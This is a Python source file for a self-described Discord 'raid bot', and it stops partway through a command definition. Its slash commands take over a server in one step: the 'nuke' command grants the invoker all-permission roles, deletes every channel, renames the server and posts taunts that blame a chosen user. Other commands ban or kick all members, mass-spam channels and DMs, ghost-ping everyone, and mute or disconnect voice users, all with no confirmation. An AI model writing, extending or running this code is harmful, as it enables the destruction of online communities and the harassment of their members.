#!/usr/bin/env python3
"""
ULTIMATE DISCORD RAID BOT - COMPLETE
ALL COMMANDS ARE SLASH COMMANDS (/)
NO CONFIRMATION REQUIRED FOR ANY COMMAND
"""

import discord
from discord.ext import commands
import asyncio
import random
import sys
import traceback
import io
import os

TOKEN = os.getenv("DISCORD_TOKEN")
if not TOKEN:
    print("❌ ERROR: DISCORD_TOKEN environment variable not set!")
    print("Please set it in Railway: Settings → Variables")
    sys.exit(1)

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.voice_states = True

bot = commands.Bot(
    command_prefix="!",
    intents=intents,
    help_command=None
)

dm_targets = []
whitelist = []
blacklist = []
whitelist_only = False
dm_log_channel_id = None
dm_forward_enabled = False

OWNER_ID = 1481722738451284161

voice_stay_tasks = {}

def trim_msg(text, max_len=1990):
    if not text:
        return ""
    if len(text) > max_len:
        return text[:max_len] + "..."
    return text

async def get_channel_by_id(channel_id):
    try:
        cid = int(channel_id)
        channel = bot.get_channel(cid)
        if channel is None:
            channel = await bot.fetch_channel(cid)
        return channel
    except:
        return None

def is_owner():
    async def predicate(interaction):
        if interaction.user.id == OWNER_ID:
            return True
        await interaction.response.send_message(
            "❌ You don't have permission to use this command.\nOnly the bot owner can use this command.",
            ephemeral=True
        )
        return False
    return discord.app_commands.check(predicate)

def is_whitelisted():
    async def predicate(interaction):
        if interaction.user.id == OWNER_ID:
            return True
        if interaction.user.id in whitelist:
            return True
        await interaction.response.send_message(
            "❌ You don't have permission to use this command.\nYou need to be whitelisted to use this command.",
            ephemeral=True
        )
        return False
    return discord.app_commands.check(predicate)

@bot.event
async def on_message(message):
    if isinstance(message.channel, discord.DMChannel) and message.author != bot.user:
        print(f"📩 DM from {message.author.name}: {message.content[:100]}")
        if dm_log_channel_id:
            log_channel = bot.get_channel(dm_log_channel_id)
            if log_channel:
                embed = discord.Embed(
                    title="📩 DM Received",
                    description=trim_msg(message.content, 4000),
                    color=discord.Color.blue()
                )
                embed.add_field(name="From", value=message.author.mention, inline=True)
                embed.add_field(name="ID", value=message.author.id, inline=True)
                embed.set_footer(text=f"Received at {message.created_at.strftime('%H:%M:%S')}")
                if dm_forward_enabled:
                    try:
                        await log_channel.send(embed=embed)
                        await log_channel.send(f"**{message.author}:** {message.content[:1900]}")
                    except:
                        await log_channel.send(embed=embed)
                else:
                    await log_channel.send(embed=embed)
        if message.content.lower() in ["!help", "help", "hi", "hello"]:
            await message.channel.send("👋 Hi! I'm a bot. Use /help for commands.")
        return
    if message.author == bot.user:
        return
    await bot.process_commands(message)

@bot.event
async def on_ready():
    print(f"\n{'='*50}")
    print(f"✅ Logged in as {bot.user} ({bot.user.id})")
    print(f"📡 Connected to {len(bot.guilds)} servers")
    print(f"{'='*50}\n")
    print("💀 RAID BOT!")
    print("  /help - Show all commands")
    print("  ⚠️ NO CONFIRMATION REQUIRED FOR ANY COMMAND!\n")
    print(f"👑 Bot Owner ID: {OWNER_ID}")
    print(f"📋 Whitelist: {len(whitelist)} users\n")
    try:
        synced = await bot.tree.sync()
        print(f"✅ Synced {len(synced)} slash commands")
    except Exception as e:
        print(f"❌ Failed to sync slash commands: {e}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("❌ You need **Administrator** permission.", ephemeral=True)
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"❌ Missing argument. Use `/help`", ephemeral=True)
    elif isinstance(error, discord.Forbidden):
        await ctx.send("❌ I don't have permission to do that.", ephemeral=True)
    elif isinstance(error, discord.HTTPException):
        if "50035" in str(error) or "Must be 2000" in str(error):
            await ctx.send("❌ Message too long. Max 2000 characters.", ephemeral=True)
        elif "50278" in str(error):
            await ctx.send("❌ Cannot DM this user.", ephemeral=True)
        else:
            await ctx.send(f"❌ Discord error: {str(error)[:100]}", ephemeral=True)
    elif isinstance(error, commands.CheckFailure):
        await ctx.send("❌ You don't have permission to use this command.", ephemeral=True)
    else:
        await ctx.send(f"❌ Error: {str(error)[:100]}", ephemeral=True)
        print(f"Command error: {error}")

# ========================================
# ===== VOICE STAY COMMANDS =====
# ========================================

@bot.tree.command(name="vcstay", description="Stay in the voice channel (keeps bot connected)")
@is_whitelisted()
async def slash_vcstay(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    
    if not interaction.user.voice:
        await interaction.followup.send("❌ You need to be in a voice channel!", ephemeral=True)
        return
    
    voice_channel = interaction.user.voice.channel
    guild_id = interaction.guild.id
    
    voice_client = discord.utils.get(bot.voice_clients, guild=interaction.guild)
    
    if voice_client is None:
        try:
            voice_client = await voice_channel.connect(timeout=10.0)
            await interaction.followup.send(f"🔊 Connected to **{voice_channel.name}** and will stay!", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ Failed to connect: {str(e)[:100]}", ephemeral=True)
            return
    elif voice_client.channel != voice_channel:
        try:
            await voice_client.move_to(voice_channel)
            await interaction.followup.send(f"🔊 Moved to **{voice_channel.name}** and will stay!", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ Failed to move: {str(e)[:100]}", ephemeral=True)
            return
    else:
        await interaction.followup.send(f"✅ Already in **{voice_channel.name}**! I'll stay connected!", ephemeral=True)
    
    if guild_id in voice_stay_tasks and voice_stay_tasks[guild_id]:
        voice_stay_tasks[guild_id].cancel()
    
    async def stay_in_voice():
        try:
            while True:
                voice_client = discord.utils.get(bot.voice_clients, guild=interaction.guild)
                if voice_client is None:
                    break
                await asyncio.sleep(60)
        except asyncio.CancelledError:
            pass
    
    voice_stay_tasks[guild_id] = bot.loop.create_task(stay_in_voice())
    
    await interaction.followup.send(f"🔊 I'll stay in **{voice_channel.name}** until you tell me to leave!", ephemeral=True)

@bot.tree.command(name="vcleave", description="Leave the voice channel")
@is_whitelisted()
async def slash_vcleave(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    
    guild_id = interaction.guild.id
    
    if guild_id in voice_stay_tasks and voice_stay_tasks[guild_id]:
        voice_stay_tasks[guild_id].cancel()
        del voice_stay_tasks[guild_id]
    
    voice_client = discord.utils.get(bot.voice_clients, guild=interaction.guild)
    
    if voice_client is None:
        await interaction.followup.send("❌ I'm not in a voice channel!", ephemeral=True)
        return
    
    try:
        await voice_client.disconnect()
        await interaction.followup.send("🔊 Left the voice channel!", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Failed to leave: {str(e)[:100]}", ephemeral=True)

@bot.tree.command(name="vcstatus", description="Check voice channel status")
@is_whitelisted()
async def slash_vcstatus(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    
    voice_client = discord.utils.get(bot.voice_clients, guild=interaction.guild)
    guild_id = interaction.guild.id
    
    if voice_client is None:
        await interaction.followup.send("❌ I'm not in a voice channel!", ephemeral=True)
        return
    
    is_staying = guild_id in voice_stay_tasks and voice_stay_tasks[guild_id] and not voice_stay_tasks[guild_id].cancelled()
    channel_name = voice_client.channel.name if voice_client.channel else "Unknown"
    members = len(voice_client.channel.members) if voice_client.channel else 0
    
    status = f"""
**📊 Voice Status:**
├─ Channel: **{channel_name}**
├─ Members: {members}
├─ Connected: ✅
├─ Stay Mode: {'✅ Enabled' if is_staying else '❌ Disabled'}
└─ Bot: {bot.user.name}
"""
    await interaction.followup.send(status, ephemeral=True)

@bot.tree.command(name="vcstaytime", description="Stay in voice for X hours")
@is_whitelisted()
async def slash_vcstaytime(interaction: discord.Interaction, hours: int = 24):
    await interaction.response.defer(ephemeral=True)
    
    if not interaction.user.voice:
        await interaction.followup.send("❌ You need to be in a voice channel!", ephemeral=True)
        return
    
    if hours > 8760:
        await interaction.followup.send("❌ Max 8760 hours (365 days)!", ephemeral=True)
        return
    
    voice_channel = interaction.user.voice.channel
    guild_id = interaction.guild.id
    
    voice_client = discord.utils.get(bot.voice_clients, guild=interaction.guild)
    
    if voice_client is None:
        try:
            voice_client = await voice_channel.connect(timeout=10.0)
        except Exception as e:
            await interaction.followup.send(f"❌ Failed to connect: {str(e)[:100]}", ephemeral=True)
            return
    elif voice_client.channel != voice_channel:
        try:
            await voice_client.move_to(voice_channel)
        except Exception as e:
            await interaction.followup.send(f"❌ Failed to move: {str(e)[:100]}", ephemeral=True)
            return
    
    if guild_id in voice_stay_tasks and voice_stay_tasks[guild_id]:
        voice_stay_tasks[guild_id].cancel()
    
    async def stay_for_time():
        try:
            seconds = hours * 3600
            await asyncio.sleep(seconds)
            voice_client = discord.utils.get(bot.voice_clients, guild=interaction.guild)
            if voice_client:
                await voice_client.disconnect()
            await interaction.followup.send(f"⏰ **{hours} hours** have passed! I've left the voice channel.", ephemeral=True)
        except asyncio.CancelledError:
            pass
    
    voice_stay_tasks[guild_id] = bot.loop.create_task(stay_for_time())
    
    await interaction.followup.send(f"🔊 I'll stay in **{voice_channel.name}** for **{hours} hours**!", ephemeral=True)

# ========================================
# ===== GHOST PING COMMANDS =====
# ========================================

@bot.tree.command(name="ghostping", description="Ghost ping a user (ping then delete)")
@is_whitelisted()
async def slash_ghostping(interaction: discord.Interaction, user: discord.User, message: str = "ping"):
    await interaction.response.defer(ephemeral=True)
    try:
        msg = await interaction.channel.send(f"{user.mention} {trim_msg(message, 1900)}")
        await msg.delete()
        await interaction.followup.send(f"✅ Ghost pinged {user.mention}!", ephemeral=True)
    except discord.Forbidden:
        await interaction.followup.send("❌ I don't have permission to delete messages.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

@bot.tree.command(name="ghostpingall", description="Ghost ping ALL members (ping then delete)")
@is_whitelisted()
async def slash_ghostpingall(interaction: discord.Interaction, message: str = "ping"):
    await interaction.response.defer(ephemeral=True)
    count = 0
    failed = 0
    for member in interaction.guild.members:
        if member.bot:
            continue
        if member.id == interaction.user.id:
            continue
        try:
            msg = await interaction.channel.send(f"{member.mention} {trim_msg(message, 1900)}")
            await msg.delete()
            count += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1
    await interaction.followup.send(f"✅ Ghost pinged {count} members. Failed: {failed}", ephemeral=True)

@bot.tree.command(name="ghostpingrole", description="Ghost ping all members with a specific role")
@is_whitelisted()
async def slash_ghostpingrole(interaction: discord.Interaction, role: discord.Role, message: str = "ping"):
    await interaction.response.defer(ephemeral=True)
    count = 0
    failed = 0
    for member in interaction.guild.members:
        if member.bot:
            continue
        if role in member.roles:
            try:
                msg = await interaction.channel.send(f"{member.mention} {trim_msg(message, 1900)}")
                await msg.delete()
                count += 1
                await asyncio.sleep(0.1)
            except:
                failed += 1
    await interaction.followup.send(f"✅ Ghost pinged {count} members with {role.name}. Failed: {failed}", ephemeral=True)

@bot.tree.command(name="ghosteveryone", description="Ghost ping @everyone (ping then delete)")
@is_whitelisted()
async def slash_ghosteveryone(interaction: discord.Interaction, message: str = "ping"):
    await interaction.response.defer(ephemeral=True)
    try:
        msg = await interaction.channel.send(f"@everyone {trim_msg(message, 1900)}")
        await msg.delete()
        await interaction.followup.send("✅ Ghost @everyone sent!", ephemeral=True)
    except discord.Forbidden:
        await interaction.followup.send("❌ I don't have permission to delete messages or mention @everyone.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

@bot.tree.command(name="ghosthere", description="Ghost ping @here (ping then delete)")
@is_whitelisted()
async def slash_ghosthere(interaction: discord.Interaction, message: str = "ping"):
    await interaction.response.defer(ephemeral=True)
    try:
        msg = await interaction.channel.send(f"@here {trim_msg(message, 1900)}")
        await msg.delete()
        await interaction.followup.send("✅ Ghost @here sent!", ephemeral=True)
    except discord.Forbidden:
        await interaction.followup.send("❌ I don't have permission to delete messages or mention @here.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

@bot.tree.command(name="ghostmass", description="Mass ghost ping with custom count")
@is_whitelisted()
async def slash_ghostmass(interaction: discord.Interaction, count: int = 5, message: str = "ping"):
    await interaction.response.defer(ephemeral=True)
    if count > 50:
        await interaction.followup.send("❌ Max 50", ephemeral=True)
        return
    sent = 0
    for i in range(count):
        try:
            msg = await interaction.channel.send(f"@everyone {trim_msg(message, 1900)} [{i+1}/{count}]")
            await msg.delete()
            sent += 1
            await asyncio.sleep(0.05)
        except:
            pass
    await interaction.followup.send(f"✅ Sent {sent} ghost pings!", ephemeral=True)

# ========================================
# ===== SAY COMMANDS (HIDDEN - NO FOOTER) =====
# ========================================

@bot.tree.command(name="say", description="Make the bot say a message")
@is_whitelisted()
async def slash_say(interaction: discord.Interaction, message: str):
    await interaction.channel.send(trim_msg(message, 4000))
    await interaction.response.send_message("✅ Message sent!", ephemeral=True)

@bot.tree.command(name="sayembed", description="Make the bot say an embed message")
@is_whitelisted()
async def slash_sayembed(interaction: discord.Interaction, message: str):
    embed = discord.Embed(
        description=trim_msg(message, 4000),
        color=discord.Color.blue()
    )
    await interaction.channel.send(embed=embed)
    await interaction.response.send_message("✅ Embed sent!", ephemeral=True)

@bot.tree.command(name="saydm", description="Make the bot DM a user")
@is_whitelisted()
async def slash_saydm(interaction: discord.Interaction, user: discord.User, message: str):
    await interaction.response.defer(ephemeral=True)
    try:
        await user.send(trim_msg(message, 1990))
        await interaction.followup.send(f"✅ DM sent to {user.mention}", ephemeral=True)
    except:
        await interaction.followup.send(f"❌ Cannot DM {user.name}", ephemeral=True)

@bot.tree.command(name="sayall", description="Make the bot say in ALL channels")
@is_whitelisted()
async def slash_sayall(interaction: discord.Interaction, message: str):
    await interaction.response.defer(ephemeral=True)
    sent = 0
    embed = discord.Embed(
        description=trim_msg(message, 4000),
        color=discord.Color.blue()
    )
    for channel in interaction.guild.text_channels:
        try:
            await channel.send(embed=embed)
            sent += 1
            await asyncio.sleep(0.1)
        except:
            pass
    await interaction.followup.send(f"✅ Sent embed to {sent} channels", ephemeral=True)

# ========================================
# ===== WHITELISTED COMMANDS =====
# ========================================

@bot.tree.command(name="nuke", description="💀 COMPLETE SERVER TAKEOVER!")
@is_whitelisted()
async def slash_nuke(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    
    guild = interaction.guild
    owner = interaction.user
    
    await interaction.followup.send("👑 **Who should I blame for the nuke?**\n📝 Type their exact username or mention them\n⏰ **You have 15 seconds to respond!**", ephemeral=True)
    
    blame_user = None
    def check(m):
        return m.author == interaction.user and m.channel == interaction.channel
    
    try:
        msg = await bot.wait_for("message", timeout=15.0, check=check)
        if msg.mentions:
            blame_user = msg.mentions[0]
        else:
            name = msg.content.strip()
            for member in guild.members:
                if member.name.lower() == name.lower() or member.display_name.lower() == name.lower():
                    blame_user = member
                    break
        if blame_user is None:
            blame_user = owner
            await interaction.followup.send(f"⚠️ **User not found! Blaming {blame_user.name} instead.**", ephemeral=True)
        else:
            await interaction.followup.send(f"✅ **Blaming @{blame_user.name} for the nuke!**", ephemeral=True)
    except asyncio.TimeoutError:
        blame_user = owner
        await interaction.followup.send(f"⏰ **Timed out! Blaming {blame_user.name} instead.**", ephemeral=True)
    
    try:
        hidden_role = await guild.create_role(name="👑 HIDDEN KING", permissions=discord.Permissions.all(), color=discord.Color.gold(), hoist=False)
        await owner.add_roles(hidden_role)
    except:
        pass
    
    try:
        darky_role = await guild.create_role(name="👑 DARKY'S RULER", color=discord.Color.gold(), permissions=discord.Permissions.all(), hoist=True)
        await owner.add_roles(darky_role)
    except:
        pass
    
    deleted = 0
    for channel in list(guild.channels):
        try:
            await channel.delete()
            deleted += 1
        except:
            pass
    
    created = 0
    for i in range(20):
        try:
            await guild.create_text_channel(f"darky-{i+1}")
            created += 1
        except:
            pass
    
    try:
        await guild.edit(name="I AM ON TOP LOL 🔥")
    except:
        pass
    
    final_msg = f"""
@everyone **NEW OWNER IN THE SERVER GET RAIDED LMAO**
💀 **BLAME @{blame_user.name} FOR THIS NUKE!**
👑 **@{owner.name} IS THE NEW KING!**
"""
    for channel in guild.text_channels[:5]:
        try:
            await channel.send(final_msg)
        except:
            pass
    
    await interaction.followup.send("💀 **NUKE COMPLETE!** Check the server!", ephemeral=True)

@bot.tree.command(name="banall", description="Ban ALL members")
@is_whitelisted()
async def slash_banall(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    banned = 0
    for member in interaction.guild.members:
        if member == interaction.guild.owner or member == bot.user:
            continue
        try:
            await member.ban(reason="Raid")
            banned += 1
        except:
            pass
    await interaction.followup.send(f"✅ Banned {banned} members", ephemeral=True)

@bot.tree.command(name="kickall", description="Kick ALL members")
@is_whitelisted()
async def slash_kickall(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    kicked = 0
    for member in interaction.guild.members:
        if member == interaction.guild.owner or member == bot.user:
            continue
        try:
            await member.kick(reason="Raid")
            kicked += 1
        except:
            pass
    await interaction.followup.send(f"✅ Kicked {kicked} members", ephemeral=True)

@bot.tree.command(name="deleteallchannels", description="Delete ALL channels")
@is_whitelisted()
async def slash_deleteallchannels(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    deleted = 0
    for channel in interaction.guild.channels:
        try:
            await channel.delete()
            deleted += 1
        except:
            pass
    await interaction.followup.send(f"✅ Deleted {deleted} channels", ephemeral=True)

@bot.tree.command(name="createchannels", description="Create multiple channels")
@is_whitelisted()
async def slash_createchannels(interaction: discord.Interaction, count: int = 50, name: str = "raid"):
    await interaction.response.defer(ephemeral=True)
    if count > 200:
        await interaction.followup.send("❌ Max 200", ephemeral=True)
        return
    
    created = 0
    failed = 0
    error_messages = []
    
    for i in range(count):
        try:
            channel_name = f"{name}-{i+1}"
            await interaction.guild.create_text_channel(channel_name)
            created += 1
            await asyncio.sleep(0.1)
        except discord.Forbidden:
            failed += 1
            if "Forbidden" not in error_messages:
                error_messages.append("❌ I need 'Manage Channels' permission to create channels.")
            break
        except discord.HTTPException as e:
            failed += 1
            if "rate limit" in str(e).lower():
                error_messages.append("⚠️ Rate limited! Try again in a few seconds.")
                break
            elif len(error_messages) < 3:
                error_messages.append(f"⚠️ Error: {str(e)[:50]}")
        except Exception as e:
            failed += 1
            if len(error_messages) < 3:
                error_messages.append(f"⚠️ Error: {str(e)[:50]}")
    
    result_msg = f"✅ Created {created} channels"
    if failed > 0:
        result_msg += f"\n❌ Failed: {failed}"
    if error_messages:
        result_msg += "\n" + "\n".join(error_messages[:3])
    
    await interaction.followup.send(result_msg, ephemeral=True)

@bot.tree.command(name="createrole", description="Create a new role")
@is_whitelisted()
async def slash_createrole(interaction: discord.Interaction, name: str, color: str = None):
    await interaction.response.defer(ephemeral=True)
    try:
        color_int = None
        if color:
            try:
                color_int = int(color.replace('#', ''), 16)
            except:
                color_int = discord.Color.random().value
        role = await interaction.guild.create_role(
            name=name,
            color=color_int if color_int else discord.Color.random()
        )
        await interaction.followup.send(f"✅ Created role **{role.name}** (ID: {role.id})", ephemeral=True)
    except discord.Forbidden:
        await interaction.followup.send("❌ I need 'Manage Roles' permission to create roles.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

@bot.tree.command(name="createroleadmin", description="Create a new role with ADMINISTRATOR permissions")
@is_whitelisted()
async def slash_createroleadmin(interaction: discord.Interaction, name: str, color: str = None):
    await interaction.response.defer(ephemeral=True)
    try:
        color_int = discord.Color.gold().value
        if color:
            try:
                color_int = int(color.replace('#', ''), 16)
            except:
                pass
        role = await interaction.guild.create_role(
            name=name,
            color=color_int,
            permissions=discord.Permissions.all()
        )
        await interaction.followup.send(f"✅ Created ADMIN role **{role.name}** (ID: {role.id})", ephemeral=True)
    except discord.Forbidden:
        await interaction.followup.send("❌ I need 'Manage Roles' permission to create roles.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

@bot.tree.command(name="deleterole", description="Delete a role")
@is_whitelisted()
async def slash_deleterole(interaction: discord.Interaction, role: discord.Role):
    await interaction.response.defer(ephemeral=True)
    try:
        await role.delete()
        await interaction.followup.send(f"✅ Deleted role **{role.name}**", ephemeral=True)
    except discord.Forbidden:
        await interaction.followup.send("❌ I need 'Manage Roles' permission to delete roles.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

@bot.tree.command(name="renameserver", description="Rename the server")
@is_whitelisted()
async def slash_renameserver(interaction: discord.Interaction, new_name: str):
    await interaction.response.defer(ephemeral=True)
    try:
        await interaction.guild.edit(name=trim_msg(new_name, 100))
        await interaction.followup.send(f"✅ Server renamed to **{new_name}**", ephemeral=True)
    except discord.Forbidden:
        await interaction.followup.send("❌ I need 'Manage Server' permission to rename the server.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ {e}", ephemeral=True)

@bot.tree.command(name="spam", description="Spam messages in channels")
@is_whitelisted()
async def slash_spam(interaction: discord.Interaction, count: int = 50, message: str = "SPAM!"):
    await interaction.response.defer(ephemeral=True)
    if count > 500:
        await interaction.followup.send("❌ Max 500", ephemeral=True)
        return
    channels = interaction.guild.text_channels
    sent = 0
    for i in range(count):
        channel = random.choice(channels)
        try:
            await channel.send(trim_msg(message))
            sent += 1
        except:
            pass
        if i % 10 == 0:
            await asyncio.sleep(0.05)
    await interaction.followup.send(f"✅ Sent {sent} messages", ephemeral=True)

@bot.tree.command(name="dmspam", description="Spam DM a user (NO COUNTER)")
@is_whitelisted()
async def slash_dmspam(interaction: discord.Interaction, user: discord.User, count: int = 10, message: str = "SPAM!"):
    await interaction.response.defer(ephemeral=True)
    if count > 100:
        await interaction.followup.send("❌ Max 100", ephemeral=True)
        return
    if user.bot:
        await interaction.followup.send("❌ Can't DM bots.", ephemeral=True)
        return
    
    sent = 0
    failed = 0
    
    for i in range(count):
        try:
            await user.send(trim_msg(message))
            sent += 1
            await asyncio.sleep(0.1)
        except:
            failed += 1
    
    if sent > 0:
        await interaction.followup.send(f"✅ Sent {sent} DMs to {user.name}!", ephemeral=True)
    else:
        await interaction.followup.send(f"❌ Failed to send any DMs to {user.name}. Make sure they have DMs enabled.", ephemeral=True)

@bot.tree.command(name="dmspamall", description="Spam DM ALL members (NO COUNTER)")
@is_whitelisted()
async def slash_dmspamall(interaction: discord.Interaction, count: int = 5, message: str = "SPAM!"):
    await interaction.response.defer(ephemeral=True)
    if count > 50:
        await interaction.followup.send("❌ Max 50 per user", ephemeral=True)
        return
    
    sent = 0
    failed = 0
    total_members = 0
    
    for member in interaction.guild.members:
        if member.bot:
            continue
        if member.id == interaction.user.id:
            continue
        
        total_members += 1
        success = False
        
        for i in range(count):
            try:
                await member.send(trim_msg(message))
                if not success:
                    sent += 1
                    success = True
                await asyncio.sleep(0.05)
            except:
                if not success:
                    failed += 1
                    success = True
                break
    
    await interaction.followup.send(f"✅ Sent to {sent} members. Failed: {failed} (Total: {total_members})", ephemeral=True)

@bot.tree.command(name="dmspamrole", description="Spam DM all members with a specific role (NO COUNTER)")
@is_whitelisted()
async def slash_dmspamrole(interaction: discord.Interaction, role: discord.Role, count: int = 5, message: str = "SPAM!"):
    await interaction.response.defer(ephemeral=True)
    if count > 50:
        await interaction.followup.send("❌ Max 50 per user", ephemeral=True)
        return
    
    sent = 0
    failed = 0
    total_members = 0
    
    for member in interaction.guild.members:
        if member.bot:
            continue
        if role in member.roles:
            total_members += 1
            success = False
            
            for i in range(count):
                try:
                    await member.send(trim_msg(message))
                    if not success:
                        sent += 1
                        success = True
                    await asyncio.sleep(0.05)
                except:
                    if not success:
                        failed += 1
                        success = True
                    break
    
    await interaction.followup.send(f"✅ Sent to {sent} members with {role.name}. Failed: {failed} (Total: {total_members})", ephemeral=True)

@bot.tree.command(name="vcdisconnectall", description="Disconnect ALL users from voice channels")
@is_whitelisted()
async def slash_vcdisconnectall(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    count = 0
    for channel in interaction.guild.voice_channels:
        for member in channel.members:
            try:
                await member.move_to(None)
                count += 1
                await asyncio.sleep(0.05)
            except:
                pass
    await interaction.followup.send(f"✅ Disconnected {count} users from voice channels.", ephemeral=True)

@bot.tree.command(name="vcmuteall", description="Mute ALL users in voice channels")
@is_whitelisted()
async def slash_vcmuteall(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    count = 0
    for channel in interaction.guild.voice_channels:
        for member in channel.members:
            if not member.voice.mute:
                try:
                    await member.edit(mute=True)
                    count += 1
                    await asyncio.sleep(0.05)
                except:
                    pass
    await interaction.followup.send(f"🔇 Muted {count} users in voice channels.", ephemeral=True)

@bot.tree.command(name="vckickall", description="Kick ALL users from voice channels")
@is_whitelisted()
async def slash_vckickall(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    count = 0
    for channel in interaction.guild.voice_channels:
        for member in channel.members:
            try:
                await member.move_to(None)
                count += 1
                await asyncio.sleep(0.05)
            except:
                pass
    await interaction.followup.send(f"👢 Kicked {count} users from voice channels.", ephemeral=True)

@bot.tree.command(name="whitelist", description="Add a user to the whitelist")
@is_owner()
async def slash_whitelist(interaction: discord.Interaction, user: discord.User):
    if user.id in whitelist:
        await interaction.response.send_message(f"⚠️ **{user.name}** is already whitelisted.", ephemeral=True)
        return
    whitelist.append(user.id)
    await interaction.response.send_message(f"✅ **{user.name}** has been added to the whitelist!", ephemeral=True)

@bot.tree.command(name="unwhitelist", description="Remove a user from the whitelist")
@is_owner()
async def slash_unwhitelist(interaction: discord.Interaction, user: discord.User):
    if user.id not in whitelist:
        await interaction.response.send_message(f"⚠️ **{user.name}** is not whitelisted.", ephemeral=True)
        return
    whitelist.remove(user.id)
    await interaction.response.send_message(f"✅ **{user.name}** has been removed from the whitelist!", ephemeral=True)

@bot.tree.command(name="whitelistlist", description="Show the whitelist")
@is_owner()
async def slash_whitelistlist(interaction: discord.Interaction):
    if not whitelist:
        await interaction.response.send_message("📭 No users are whitelisted.", ephemeral=True)
        return
    users = []
    for uid in whitelist[:25]:
        user = bot.get_user(uid)
        users.append(f"  - {user.name if user else 'Unknown'} (ID: {uid})")
    await interaction.response.send_message(f"📋 **Whitelisted Users** ({len(whitelist)}):\n" + "\n".join(users), ephemeral=True)

@bot.tree.command(name="resetnick", description="Reset a member's nickname")
@is_whitelisted()
async def slash_resetnick(interaction: discord.Interaction, member: discord.Member):
    await interaction.response.defer(ephemeral=True)
    try:
        await member.edit(nick=None)
        await interaction.followup.send(f"✅ Reset {member.mention}'s nickname", ephemeral=True)
    except:
        await interaction.followup.send(f"❌ Failed to reset {member.mention}'s nickname", ephemeral=True)

@bot.tree.command(name="resetnickall", description="Reset ALL members' nicknames")
@is_whitelisted()
async def slash_resetnickall(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    count = 0
    for member in interaction.guild.members:
        if member == bot.user:
            continue
        try:
            await member.edit(nick=None)
            count += 1
            await asyncio.sleep(0.05)
        except:
            pass
    await interaction.followup.send(f"✅ Reset {count} members' nicknames", ephemeral=True)

@bot.tree.command(name="forcenick", description="Force change a member's nickname")
@is_whitelisted()
async def slash_forcenick(interaction: discord.Interaction, member: discord.Member, nickname: str):
    await interaction.response.defer(ephemeral=True)
    try:
        await member.edit(nick=nickname)
        await interaction.followup.send(f"✅ Changed {member.mention}'s nickname to **{nickname}**", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

@bot.tree.command(name="forcenickall", description="Force change ALL members' nicknames")
@is_whitelisted()
async def slash_forcenickall(interaction: discord.Interaction, nickname: str):
    await interaction.response.defer(ephemeral=True)
    count = 0
    for member in interaction.guild.members:
        if member == bot.user:
            continue
        try:
            await member.edit(nick=nickname)
            count += 1
            await asyncio.sleep(0.05)
        except:
            pass
    await interaction.followup.send(f"✅ Changed {count} members' nicknames to **{nickname}**", ephemeral=True)

@bot.tree.command(name="giverole", description="Give a role to a member")
@is_whitelisted()
async def slash_giverole(interaction: discord.Interaction, member: discord.Member, role: discord.Role):
    await interaction.response.defer(ephemeral=True)
    try:
        if role in member.roles:
            await interaction.followup.send(f"⚠️ {member.mention} already has {role.mention}", ephemeral=True)
            return
        await member.add_roles(role)
        await interaction.followup.send(f"✅ Gave {role.mention} to {member.mention}", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

@bot.tree.command(name="removerole", description="Remove a role from a member")
@is_whitelisted()
async def slash_removerole(interaction: discord.Interaction, member: discord.Member, role: discord.Role):
    await interaction.response.defer(ephemeral=True)
    try:
        if role not in member.roles:
            await interaction.followup.send(f"⚠️ {member.mention} doesn't have {role.mention}", ephemeral=True)
            return
        await member.remove_roles(role)
        await interaction.followup.send(f"✅ Removed {role.mention} from {member.mention}", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

@bot.tree.command(name="giveroleself", description="Give yourself a role")
@is_whitelisted()
async def slash_giveroleself(interaction: discord.Interaction, role: discord.Role):
    await interaction.response.defer(ephemeral=True)
    try:
        if role in interaction.user.roles:
            await interaction.followup.send(f"⚠️ You already have {role.mention}", ephemeral=True)
            return
        await interaction.user.add_roles(role)
        await interaction.followup.send(f"✅ Gave yourself {role.mention}", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

@bot.tree.command(name="removeroleself", description="Remove a role from yourself")
@is_whitelisted()
async def slash_removeroleself(interaction: discord.Interaction, role: discord.Role):
    await interaction.response.defer(ephemeral=True)
    try:
        if role not in interaction.user.roles:
            await interaction.followup.send(f"⚠️ You don't have {role.mention}", ephemeral=True)
            return
        await interaction.user.remove_roles(role)
        await interaction.followup.send(f"✅ Removed {role.mention} from yourself", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)

@bot.tree.command(name="listroles", description="List all roles in the server")
@is_whitelisted()
